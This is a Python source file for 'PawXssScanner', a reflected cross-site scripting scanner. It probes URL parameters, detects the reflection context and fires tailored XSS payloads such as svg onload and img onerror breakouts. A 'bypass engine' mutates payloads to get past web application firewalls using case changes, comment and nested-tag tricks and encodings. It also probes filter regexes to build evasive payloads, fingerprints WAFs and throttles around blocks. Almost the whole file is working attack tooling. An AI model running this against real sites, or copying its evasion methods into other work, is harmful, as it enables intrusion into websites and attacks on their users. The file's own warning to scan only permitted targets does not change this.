#!/usr/bin/env python3
"""PawXssScanner - fast reflected XSS scanner.

Probe-first design: for each parameter, a unique marker is sent first. Only
parameters that reflect the marker are tested further, and payloads are picked
to match the reflection context (html, attribute, script, comment) instead of
spraying the whole list blindly.

Usage:
    python3 pawxss.py -u "https://target.com/search?q=test" -p payloads.txt
    python3 pawxss.py -u "https://target.com/search?q=test" --json out.json -v

Only scan targets you own or have written permission to test.
"""

import argparse
import concurrent.futures
import json
import random
import re
import shutil
import string
import sys
import threading
import time
import urllib.parse

try:
    import requests
except ImportError:
    sys.exit("the 'requests' library is required: pip install -r requirements.txt")

VERSION = "1.3.0"
USER_AGENT = f"PawXssScanner/{VERSION}"
DEFAULT_TIMEOUT = 12
DEFAULT_MAX_VARIANTS = 6

BANNER = r"""
██████╗  █████╗ ██╗    ██╗
██╔══██╗██╔══██╗██║    ██║
██████╔╝███████║██║ █╗ ██║
██╔═══╝ ██╔══██║██║███╗██║
██║     ██║  ██║╚███╔███╔╝
╚═╝     ╚═╝  ╚═╝ ╚══╝╚══╝
      X S S   S C A N N E R
"""


def print_banner():
    print(red(BANNER.rstrip("\n")))
    print(red(f"PawXssScanner v{VERSION} - Reflected XSS Scanner + Bypass Engine"))
    print(red("Made by Rushikesh362"))
    print()
    rule()

# ---------------------------------------------------------------------------
# output helpers (plain ANSI, disabled when not a tty or on Windows without it)
# ---------------------------------------------------------------------------

_USE_COLOR = sys.stdout.isatty()


def _paint(code, text):
    if not _USE_COLOR:
        return text
    return f"\033[{code}m{text}\033[0m"


def red(t): return _paint("91", t)
def green(t): return _paint("92", t)
def yellow(t): return _paint("93", t)
def cyan(t): return _paint("96", t)
def dim(t): return _paint("2", t)


def rule(char="─"):
    """A dim divider line between output sections. Width follows the terminal."""
    try:
        width = shutil.get_terminal_size(fallback=(70, 20)).columns
    except Exception:
        width = 70
    print(dim(char * max(20, min(width, 72))))


# ---------------------------------------------------------------------------
# URL helpers
# ---------------------------------------------------------------------------

def get_params(url):
    """Ordered {name: value} of the query string. First value wins."""
    out = {}
    for name, value in urllib.parse.parse_qsl(
            urllib.parse.urlparse(url).query, keep_blank_values=True):
        out.setdefault(name, value)
    return out


def set_param(url, param, value):
    """Return url with param replaced by value, everything else untouched."""
    parts = urllib.parse.urlparse(url)
    pairs = urllib.parse.parse_qsl(parts.query, keep_blank_values=True)
    seen, out = False, []
    for name, old in pairs:
        if name == param and not seen:
            out.append((name, value))
            seen = True
        elif name != param:
            out.append((name, old))
    if not seen:
        out.append((param, value))
    return urllib.parse.urlunparse(
        (parts.scheme, parts.netloc, parts.path, parts.params,
         urllib.parse.urlencode(out, doseq=True), parts.fragment))


def set_param_raw(url, param, value):
    """Like set_param but keeps %XX sequences intact (no double-encoding).

    Needed for filler probes: %09 must reach the server as %09 (a tab after
    one decode), not as the literal 3 characters %2509.
    """
    parts = urllib.parse.urlparse(url)
    pairs = urllib.parse.parse_qsl(parts.query, keep_blank_values=True)
    seen, out = False, []
    for name, old in pairs:
        if name == param and not seen:
            out.append(f"{urllib.parse.quote(name, safe='')}="
                       f"{urllib.parse.quote(value, safe='%')}")
            seen = True
        elif name != param:
            out.append(f"{urllib.parse.quote(name, safe='')}"
                       f"={urllib.parse.quote(old, safe='')}")
    if not seen:
        out.append(f"{urllib.parse.quote(param, safe='')}"
                   f"={urllib.parse.quote(value, safe='%')}")
    return urllib.parse.urlunparse(
        (parts.scheme, parts.netloc, parts.path, parts.params,
         "&".join(out), parts.fragment))


def random_marker(tag="pw", length=8):
    body = "".join(random.choices(string.ascii_lowercase + string.digits, k=length))
    return f"{tag}{tag}{body}"


# ---------------------------------------------------------------------------
# reflection context detection
# ---------------------------------------------------------------------------
# A marker can land in four places, and each one needs a different breakout:
#   html      <p>MARKER</p>                    -> close the tag: <svg/onload=...>
#   attribute <input value="MARKER">           -> break out: "><svg/onload=...>
#   script    <script>var x = 'MARKER';</script> -> break out: </script><svg/...>
#   comment   <!-- MARKER -->                  -> close it: --><svg/onload=...>
# ---------------------------------------------------------------------------

def find_contexts(body, marker):
    """Every reflection context of marker in body, in order of appearance."""
    contexts = []
    start = 0
    lower = body.lower()
    while True:
        idx = body.find(marker, start)
        if idx == -1:
            break
        contexts.append(_classify_at(body, lower, idx))
        start = idx + len(marker)
    return contexts


def _classify_at(body, lower, idx):
    head = lower[:idx]
    # inside an html comment?
    if head.rfind("<!--") > head.rfind("-->"):
        return "comment"
    # inside a script block?
    if head.rfind("<script") > head.rfind("</script"):
        return "script"
    # inside a tag? find the nearest unclosed '<' before the marker.
    tag_open = head.rfind("<")
    tag_close = head.rfind(">")
    if tag_open > tag_close:
        tag = head[tag_open:]
        # an = sign after the last whitespace run means attribute value.
        tail = tag.split()[-1] if tag.split() else ""
        if "=" in tail:
            quote = tail.split("=", 1)[1][:1]
            if quote in ("'", '"'):
                return "attribute-single" if quote == "'" else "attribute"
            return "attribute-unquoted"
        return "tag"
    return "html"


# ---------------------------------------------------------------------------
# payloads: small context-tailored sets. The wordlist file is the fallback
# pool for anything the context sets do not cover.
# ---------------------------------------------------------------------------

CONTEXT_PAYLOADS = {
    "html": [
        "<svg/onload=alert(1)>",
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<details open ontoggle=alert(1)>",
    ],
    "attribute": [
        '"><svg/onload=alert(1)>',
        '" autofocus onfocus=alert(1) x="',
        '"><img src=x onerror=alert(1)>',
    ],
    "attribute-single": [
        "'><svg/onload=alert(1)>",
        "' autofocus onfocus=alert(1) x='",
    ],
    "attribute-unquoted": [
        "><svg/onload=alert(1)>",
        '"onmouseover="alert(1)',
    ],
    "script": [
        "</script><svg/onload=alert(1)>",
        "-alert(1)-",
        "';alert(1)//",
        "\";alert(1)//",
    ],
    "comment": [
        "--><svg/onload=alert(1)>",
        "--><script>alert(1)</script>",
    ],
    "tag": [
        "><svg/onload=alert(1)>",
        '" onmouseover=alert(1) x="',
    ],
}

GENERIC_PAYLOADS = [
    "<svg/onload=alert(1)>",
    "\"><svg onload=alert(1)>",
    "'\"><img src=x onerror=alert(1)>",
    "';alert(1)//",
    "\"><script>alert(document.domain)</script>",
    "<iframe src=javascript:alert(1)>",
]


def load_payloads(path, limit=0):
    """Wordlist file, one payload per line. # lines and blanks are skipped."""
    items = []
    try:
        with open(path, encoding="utf-8", errors="replace") as fh:
            for line in fh:
                line = line.strip()
                if not line or line.startswith("#"):
                    continue
                items.append(line)
    except OSError as exc:
        sys.exit(f"cannot read payload file {path}: {exc}")
    if limit and limit > 0:
        items = items[:limit]
    if not items:
        sys.exit(f"payload file {path} has no usable lines")
    return items


def payloads_for(context, wordlist):
    """Context set first, then wordlist entries not already covered."""
    seen = set()
    out = []
    for payload in CONTEXT_PAYLOADS.get(context, []) + GENERIC_PAYLOADS:
        if payload not in seen:
            seen.add(payload)
            out.append(payload)
    for payload in wordlist:
        if payload not in seen:
            seen.add(payload)
            out.append(payload)
    return out


# ---------------------------------------------------------------------------
# bypass engine: deterministic mutations + charset viability probe
# ---------------------------------------------------------------------------
# WAFs usually match lowercase signatures, so every mutation changes the shape
# of the payload without changing what the browser executes:
#   case      <svg/onload=...> -> <sVg/oNlOaD=...>
#   comments  <svg/onload=...> -> <svg/**/onload=...>
#   breaks    <svg/onload=...> -> <svg%0aonload=...> (newline/tab separator)
# Encoded variants are only sent when the charset probe proves the server
# decodes that encoding - otherwise they are dead requests.
# ---------------------------------------------------------------------------

def mutate_case(payload):
    """Alternate letter case inside tag names: <svg -> <sVg, onload -> oNlOaD."""
    res, in_tag, upper = [], False, False
    for ch in payload:
        if ch == "<":
            in_tag = True
            res.append(ch)
            continue
        if ch == ">":
            in_tag = False
            res.append(ch)
            continue
        if in_tag and ch.isalpha():
            res.append(ch.upper() if upper else ch.lower())
            upper = not upper
        else:
            res.append(ch)
    return "".join(res)


def mutate_comments(payload):
    """JS-style comment breaks inside the tag: <svg/onload -> <svg/**/onload."""
    if "<svg/" in payload:
        return payload.replace("<svg/", "<svg/**/", 1)
    if "<script" in payload:
        return payload.replace("<script", "<script/**/", 1)
    if "<img" in payload:
        return payload.replace("<img", "<img/**/", 1)
    if " " in payload:
        return payload.replace(" ", "/**/", 1)
    return payload


def mutate_breaks(payload):
    """Newline/tab separators where a space or slash would be filtered."""
    if "/onload" in payload:
        return payload.replace("/onload", "%0aonload", 1)
    if " " in payload:
        return payload.replace(" ", "%09", 1)
    return payload


def mutate_events(payload):
    """Swap the event handler / sink: filters often blocklist one keyword."""
    for a, b in (("onload", "onerror"), ("onerror", "onfocus"),
                 ("onfocus", "onmouseover"), ("alert", "prompt")):
        if a in payload:
            return payload.replace(a, b, 1)
    return payload


def mutate_quotes(payload):
    """Swap the quote style: a filter stripping only double quotes misses this."""
    if '"' in payload:
        return payload.replace('"', "'", 1)
    if "'" in payload and "&#x27;" not in payload:
        return payload.replace("'", "&#x27;", 1)
    return payload


def mutate_nested(payload):
    """Nested tags: a filter that strips <script> once leaves one behind."""
    if "<script>" in payload:
        return payload.replace("<script>", "<scr<script>ipt>", 1)
    if "<svg" in payload:
        return payload.replace("<svg", "<sv<svg>g", 1)
    if "<img" in payload:
        return payload.replace("<img", "<im<img>g", 1)
    return payload


def encode_url(payload):
    return (payload.replace("%", "%25").replace("<", "%3C").replace(">", "%3E")
            .replace('"', "%22").replace("'", "%27").replace(" ", "%20"))


def encode_double_url(payload):
    return encode_url(payload).replace("%", "%25")


def encode_entities(payload):
    return (payload.replace("&", "&amp;").replace("<", "&lt;")
            .replace(">", "&gt;").replace('"', "&quot;"))


ENCODINGS = (
    ("url", "%3C", "<", encode_url),
    ("double-url", "%253C", "<", encode_double_url),
    ("entity", "&lt;", "<", encode_entities),
)

MUTATIONS = (
    ("case", mutate_case),
    ("comments", mutate_comments),
    ("breaks", mutate_breaks),
    ("events", mutate_events),
    ("quotes", mutate_quotes),
    ("nested", mutate_nested),
)


def expand_variants(payload, viable_encodings, max_variants):
    """Payload plus its bypass variants, capped. Original always first."""
    out = [payload]
    for _name, fn in MUTATIONS:
        try:
            variant = fn(payload)
        except Exception:
            continue
        if variant != payload and variant not in out:
            out.append(variant)
    for name, _sent, _decoded, fn in ENCODINGS:
        if name not in viable_encodings:
            continue
        try:
            variant = fn(payload)
        except Exception:
            continue
        if variant != payload and variant not in out:
            out.append(variant)
    if max_variants and max_variants > 0:
        out = out[:max_variants]
    return out


def charset_probe(fetch, url, param):
    """Which encodings does this endpoint decode? Returns viable names.

    Sends marker + encoded '<' + marker and checks whether the decoded form
    comes back. Only viable encodings get variants later.
    """
    viable = set()
    for name, sent, decoded, _fn in ENCODINGS:
        marker = random_marker("cs", 5)
        # Raw send: %3C must reach the server as %3C (one decode -> "<").
        # set_param would double-encode it to %253C and prove nothing.
        probe = set_param_raw(url, param, marker + sent + marker)
        try:
            resp = fetch(probe)
        except Exception:
            continue
        if _probe_ok(resp, marker + decoded + marker):
            viable.add(name)
    return viable


# ---------------------------------------------------------------------------
# adaptive bypass: probe the filter's regex, then craft around it
# ---------------------------------------------------------------------------
# Methodology (after s0md3v's "Bypassing XSS detection mechanisms"): instead
# of spraying canned payloads at a regex, send tiny probes to learn which
# fillers, tag names and event handlers pass unblocked, then build payloads
# only from viable components. A filter that blocks "onload" but never heard
# of "onauxclick" defeats itself.
# ---------------------------------------------------------------------------

FILLER_PROBES = [" ", "%09", "/", "%0a", "%0d", "/%09/"]
TAG_PROBES = ["svg", "sCrIpT", "d3v", "details", "marquee", "a"]
EVENT_PROBES = ["onload", "onxxx", "onclick", "onauxclick", "ondblclick",
                "oncontextmenu", "onmouseleave", "ontouchcancel"]
TAG_ENDINGS = [">", "", "//", "%0a", "%0d", "%09", " "]
JS_DELIMS = ["+", "-", "*", "/", "%", "|", "^", "<", ">"]
ADAPTIVE_SINKS = ["alert(1)", "prompt(1)", "[2].some(alert)", "(((prompt)))",
                  "(confirm)()", "alert`1`"]


def _probe_ok(resp, needle):
    """Viable = reflected verbatim and not a block status."""
    if isinstance(resp, tuple):
        resp = resp[0]  # Scanner.fetch returns (response, error)
    if resp is None:
        return False
    if getattr(resp, "status", None) in (403, 406, 419, 429):
        return False
    return needle in (getattr(resp, "text", "") or "")


def probe_fillers(fetch, url, param):
    """Which separators pass the filter? Order preserved, space first."""
    viable = []
    for filler in FILLER_PROBES:
        marker = random_marker("fl", 4)
        try:
            resp = fetch(set_param_raw(url, param, f"x{filler}{marker}y"))
        except Exception:
            continue
        # Compare against the decoded form: %09 arrives as a real tab.
        if _probe_ok(resp, f"x{urllib.parse.unquote(filler)}{marker}y"):
            viable.append(filler)
    return viable


def probe_tags(fetch, url, param):
    """Which tag names pass the filter? Slash separator, never a space, so
    a space-blocking filter cannot hide passing tag names."""
    viable = []
    for tag in TAG_PROBES:
        marker = random_marker("tg", 4)
        sent = f"<{tag}/{marker}>"
        try:
            resp = fetch(set_param(url, param, sent))
        except Exception:
            continue
        if _probe_ok(resp, sent):
            viable.append(tag)
    return viable


def probe_events(fetch, url, param, tag="svg"):
    """Which event handlers pass? `onxxx` tells blacklist from block-all.

    If even the nonsense handler `onxxx` is blocked, the filter matches
    `on\\w+` and no event vector can pass - the caller should move on.
    Probes run inside `tag` so a blocked tag name (e.g. svg) cannot hide
    passing handlers; separators are `/`, never a space.
    """
    viable = []
    for event in EVENT_PROBES:
        marker = random_marker("ev", 4)
        sent = f"<{tag}/{event}=x{marker}>"
        try:
            resp = fetch(set_param(url, param, sent))
        except Exception:
            continue
        if _probe_ok(resp, sent):
            viable.append(event)
    viable = [e for e in viable if e != "onxxx"]
    return viable


def build_adaptive(context, fillers, tags, events, limit=150):
    """Payloads built only from filter-passing components. Capped."""
    fillers = fillers or [" "]
    tags = tags or ["svg"]
    events = [e for e in events if e != "onxxx"] or ["onload"]
    out = []

    def push(payload):
        if len(out) < limit and payload not in out:
            out.append(payload)
        return len(out) >= limit

    if context in ("html", "comment", "tag"):
        for t in tags:
            for e in events:
                for f in fillers:
                    for s in ADAPTIVE_SINKS:
                        for end in TAG_ENDINGS:
                            if push(f"<{t}{f}{e}={s}{end}"):
                                return out
    elif context in ("attribute", "attribute-single", "attribute-unquoted"):
        q = '"' if context == "attribute" else ("'" if context == "attribute-single" else "")
        for f in fillers:
            for e in events:
                for s in ADAPTIVE_SINKS:
                    if push(f"{q}{f}{e}={s}"):
                        return out
        for t in tags:
            for e in events:
                for f in fillers:
                    for s in ADAPTIVE_SINKS[:2]:
                        if push(q + ">" + f"<{t}{f}{e}={s}>"):
                            return out
    elif context == "script":
        for q in ("'", '"'):
            for d in JS_DELIMS:
                for s in ADAPTIVE_SINKS:
                    if push(f"{q}{d}{s}//"):
                        return out
                    if push(f"{q}{d}{s}{d}{q}"):
                        return out
        for t in tags:
            for e in events:
                for f in fillers:
                    if push(f"</script><{t}{f}{e}=alert(1)>"):
                        return out
    return out


# ---------------------------------------------------------------------------
# WAF fingerprinting (header names every operator already knows) + throttle
# ---------------------------------------------------------------------------

WAF_HINTS = {
    "cloudflare": ("cf-ray", "cf-mitigated", "__cfduid", "cloudflare"),
    "akamai": ("akamai", "x-akamai"),
    "imperva": ("x-iinfo", "incap_ses", "visid_incap"),
    "sucuri": ("x-sucuri-id", "x-sucuri-cache", "sucuri"),
    "aws-waf": ("x-amzn-waf", "awselb", "x-amzn-trace-id"),
    "f5-bigip": ("bigipserver", "x-waf-event", "f5"),
    "modsecurity": ("mod_security", "modsecurity", "x-modsec"),
    "barracuda": ("barra_counter_session", "barracuda"),
}


def fingerprint_waf(headers):
    blob = " ".join(f"{k}: {v}" for k, v in (headers or {}).items()).lower()
    found = [name for name, hints in WAF_HINTS.items()
             if any(h in blob for h in hints)]
    return found


# ---------------------------------------------------------------------------
# scanner
# ---------------------------------------------------------------------------

class Finding:
    def __init__(self, param, payload, url, context, evidence, severity):
        self.param = param
        self.payload = payload
        self.url = url
        self.context = context
        self.evidence = evidence[:220]
        self.severity = severity

    def as_dict(self):
        return {"type": "Reflected XSS", "severity": self.severity,
                "param": self.param, "payload": self.payload, "url": self.url,
                "context": self.context, "evidence": self.evidence}


class Scanner:
    def __init__(self, args, wordlist):
        self.args = args
        self.wordlist = wordlist
        self.session = requests.Session()
        self.session.headers.update({"User-Agent": USER_AGENT})
        if args.cookie:
            self.session.headers["Cookie"] = args.cookie
        self.findings = []
        self.tested = 0
        self.requests = 0
        self.blocked = 0
        self.waf = []
        self.threads = max(1, args.threads)
        self._delay = args.delay
        self._charset_cache = {}
        self._lock = threading.Lock()

    # -- http --

    def fetch(self, url):
        if self._delay:
            time.sleep(self._delay)
        self.requests += 1
        headers = dict(self.session.headers)
        for raw in self.args.header or []:
            if ":" in raw:
                name, value = raw.split(":", 1)
                headers[name.strip()] = value.strip()
        try:
            if (self.args.method or "GET").upper() == "POST":
                params = get_params(url)
                base = url.split("?", 1)[0]
                resp = self.session.post(base, data=params, headers=headers,
                                         timeout=self.args.timeout,
                                         allow_redirects=True)
            else:
                resp = self.session.get(url, headers=headers,
                                        timeout=self.args.timeout,
                                        allow_redirects=True)
        except requests.RequestException as exc:
            return None, str(exc)[:160]
        if not self.waf:
            self.waf = fingerprint_waf(resp.headers)
        if resp.status_code in (403, 406, 419, 429):
            self.blocked += 1
            if self.blocked >= 3 and not self.args.no_throttle:
                self._delay = max(self._delay, 1.0) + 1.0
                if self.args.verbose:
                    print(yellow(f"[!] blocks seen ({self.blocked}), "
                                 f"throttling to {self._delay:.1f}s between requests"))
        return resp, None

    # -- stages --

    def probe_param(self, url, param):
        """Does this parameter reflect at all, and in which context?"""
        marker = random_marker()
        resp, err = self.fetch(set_param(url, param, marker))
        if resp is None or not resp.text or marker not in resp.text:
            return []
        return find_contexts(resp.text, marker)

    def test_payload(self, url, param, payload):
        target = set_param(url, param, payload)
        resp, err = self.fetch(target)
        self.tested += 1
        if resp is None or not resp.text:
            return None
        if payload in resp.text:
            context = find_contexts(resp.text, payload)
            where = context[0] if context else "html"
            severity = "High" if where in ("script", "html", "comment") else "Medium"
            snippet = _snippet(resp.text, payload)
            return Finding(param, payload, target, where, snippet, severity)
        return None

    def scan_param(self, url, param):
        contexts = self.probe_param(url, param)
        if not contexts:
            if self.args.verbose:
                print(dim(f"[-] {param}: no reflection, skipped"))
            return []
        uniq = list(dict.fromkeys(contexts))
        if self.args.verbose:
            print(cyan(f"[*] {param}: reflects in {', '.join(uniq)}"))
        viable = set()
        if not self.args.no_charset:
            if param in self._charset_cache:
                viable = self._charset_cache[param]
            else:
                viable = charset_probe(self.fetch, url, param)
                self._charset_cache[param] = viable
                if viable and self.args.verbose:
                    print(dim(f"    decodes: {', '.join(sorted(viable))}"))
        adaptive = []
        if not self.args.no_adaptive:
            fillers = probe_fillers(self.fetch, url, param)
            tags = probe_tags(self.fetch, url, param)
            events = probe_events(self.fetch, url, param,
                                  tag=tags[0] if tags else "svg")
            if self.args.verbose:
                print(dim(f"    filter passes fillers={fillers or ['-']} "
                          f"tags={tags or ['-']} events={events or ['-']}"))
            per_ctx = max(20, self.args.max_adaptive // max(1, len(uniq)))
            for context in uniq:
                adaptive.extend(build_adaptive(context, fillers, tags, events, per_ctx))
            adaptive = list(dict.fromkeys(adaptive))
            if self.args.max_adaptive and len(adaptive) >= self.args.max_adaptive:
                if self.args.verbose:
                    print(dim(f"    adaptive pool capped at {self.args.max_adaptive}"))
                adaptive = adaptive[:self.args.max_adaptive]
        pool = list(dict.fromkeys(adaptive))
        for context in uniq:
            pool.extend(payloads_for(context, self.wordlist))
        pool = list(dict.fromkeys(pool))
        expanded = []
        for payload in pool:
            if self.args.no_mutate:
                expanded.append(payload)
            else:
                expanded.extend(expand_variants(payload, viable, self.args.max_variants))
        expanded = list(dict.fromkeys(expanded))
        if self.args.max_payloads and len(expanded) > self.args.max_payloads:
            dropped = len(expanded) - self.args.max_payloads
            expanded = expanded[:self.args.max_payloads]
            print(yellow(f"[!] '{param}': kept {len(expanded)} of "
                         f"{len(expanded) + dropped} payloads "
                         f"(--max-payloads {self.args.max_payloads}, {dropped} dropped)"))
        hits = []
        for payload in expanded:
            finding = self.test_payload(url, param, payload)
            if finding:
                hits.append(finding)
                print(green(f"[+] {param}: {payload[:60]}"))
                break  # one proof per parameter is enough
            elif self.args.very_verbose:
                print(dim(f"    tried {payload[:60]}"))
        return hits

    def run(self, url):
        params = get_params(url)
        if not params:
            url = url + ("&" if "?" in url else "?") + "q=PawXssTest"
            params = {"q": "PawXssTest"}
        print(cyan("[*] Fingerprinting WAF..."))
        base, _err = self.fetch(url)
        if base is not None:
            self.waf = fingerprint_waf(base.headers)
        if self.waf:
            print(yellow(f"[*] WAF detected: {', '.join(self.waf)}"))
        else:
            print(dim("[*] WAF detected: none"))
        if self.waf and not self.args.no_throttle:
            self.threads = min(self.threads, 10)
            self._delay = max(self._delay, 0.5)
            print(yellow(f"[*] Auto-tuned: threads={self.threads} "
                         f"delay={self._delay:.1f}s"))
        mutations = "off" if self.args.no_mutate else f"on (cap {self.args.max_variants})"
        print(cyan(f"[*] Targets      : 1"))
        print(cyan(f"[*] Base payload : {len(self.wordlist)}"))
        print(cyan(f"[*] Method       : {(self.args.method or 'GET').upper()}"))
        print(cyan(f"[*] Threads      : {self.threads}"))
        print(cyan(f"[*] Mutations    : {mutations}"))
        print(cyan(f"[*] Charset probe: {'off' if self.args.no_charset else 'on'}"))
        print(cyan(f"[*] Adaptive     : {'off' if self.args.no_adaptive else 'on (probe filter, craft around it)'}"))
        rule()
        print(cyan(f"[*] Scanning {url}"))
        print(cyan("[*] parameters: " + ", ".join(params)))
        with concurrent.futures.ThreadPoolExecutor(max_workers=self.threads) as pool:
            futures = {pool.submit(self.scan_param, url, p): p for p in params}
            for future in concurrent.futures.as_completed(futures):
                try:
                    self.findings.extend(future.result() or [])
                except Exception as exc:  # one bad param must not kill the scan
                    if self.args.verbose:
                        print(red(f"[!] {futures[future]}: {exc}"))
        return self.findings


def _snippet(text, needle, radius=70):
    idx = text.find(needle)
    if idx == -1:
        idx = text.lower().find(needle.lower())
    if idx == -1:
        return re.sub(r"\s+", " ", text[:160]).strip()
    piece = text[max(0, idx - radius):idx + len(needle) + radius]
    return re.sub(r"\s+", " ", piece).strip()


# ---------------------------------------------------------------------------
# reporting
# ---------------------------------------------------------------------------

def print_summary(scanner):
    findings, tested = scanner.findings, scanner.tested
    print()
    rule()
    print(green("[✓] Scan completed"))
    print(green(f"[✓] Requests : {scanner.requests}"))
    print(green(f"[✓] WAF      : {', '.join(scanner.waf) if scanner.waf else 'none'}"))
    rule()
    if not findings:
        print(yellow("[!] No findings."))
        return
    by_sev = {}
    for f in findings:
        by_sev[f.severity] = by_sev.get(f.severity, 0) + 1
    print(red(f"[!] {len(findings)} reflected XSS finding(s) in {tested} payloads:"))
    for i, f in enumerate(findings):
        if i:
            rule("┄")
        print(f"  [{f.severity}] param '{f.param}' ({f.context})")
        print(f"    {dim(f.url[:150])}")


def write_text(findings, path):
    with open(path, "w", encoding="utf-8") as fh:
        for f in findings:
            fh.write(f"[XSS] {f.url} | {f.payload}\n")


# ---------------------------------------------------------------------------
# cli
# ---------------------------------------------------------------------------

def build_parser():
    p = argparse.ArgumentParser(
        prog="pawxss",
        description="PawXssScanner - fast reflected XSS scanner for targets "
                    "you are allowed to test.")
    p.add_argument("-u", "--url", required=True, help="target URL with parameters")
    p.add_argument("-p", "--payloads", default="payloads.txt", help="payload wordlist file")
    p.add_argument("--threads", type=int, default=20, help="concurrent workers (default 20)")
    p.add_argument("--delay", type=float, default=0.0, help="seconds between requests")
    p.add_argument("--timeout", type=int, default=DEFAULT_TIMEOUT, help="request timeout seconds")
    p.add_argument("--method", default="GET", choices=["GET", "POST"], help="request method")
    p.add_argument("-H", "--header", action="append", default=[], help="'Name: Value', repeatable")
    p.add_argument("--cookie", default="", help="cookie header value")
    p.add_argument("--max-payloads", type=int, default=0, help="cap payloads per parameter (0 = all)")
    p.add_argument("--max-variants", type=int, default=DEFAULT_MAX_VARIANTS,
                   help=f"bypass variants per payload (default {DEFAULT_MAX_VARIANTS}, 0 = unlimited)")
    p.add_argument("--no-mutate", action="store_true", help="disable bypass mutations")
    p.add_argument("--no-charset", action="store_true", help="disable charset viability probe")
    p.add_argument("--no-adaptive", action="store_true", help="disable adaptive filter probing")
    p.add_argument("--max-adaptive", type=int, default=150,
                   help="cap adaptive payloads per parameter (0 = unlimited)")
    p.add_argument("--no-throttle", action="store_true", help="never slow down on blocks")
    p.add_argument("-o", "--output", default="", help="write findings to text file")
    p.add_argument("--json", default="", help="write findings to JSON file")
    p.add_argument("-v", "--verbose", action="store_true")
    p.add_argument("-vv", "--very-verbose", action="store_true", dest="very_verbose")
    return p


def main(argv=None):
    args = build_parser().parse_args(argv)
    if not args.url.startswith(("http://", "https://")):
        args.url = "https://" + args.url
    print_banner()
    wordlist = load_payloads(args.payloads)
    scanner = Scanner(args, wordlist)
    started = time.time()
    findings = scanner.run(args.url)
    elapsed = time.time() - started
    print_summary(scanner)
    print(dim(f"    {scanner.requests} requests in {elapsed:.1f}s"))
    if args.output:
        write_text(findings, args.output)
        print(cyan(f"[*] text report: {args.output}"))
    if args.json:
        with open(args.json, "w", encoding="utf-8") as fh:
            json.dump([f.as_dict() for f in findings], fh, indent=2)
        print(cyan(f"[*] JSON report: {args.json}"))
    return 0


if __name__ == "__main__":
    sys.exit(main())
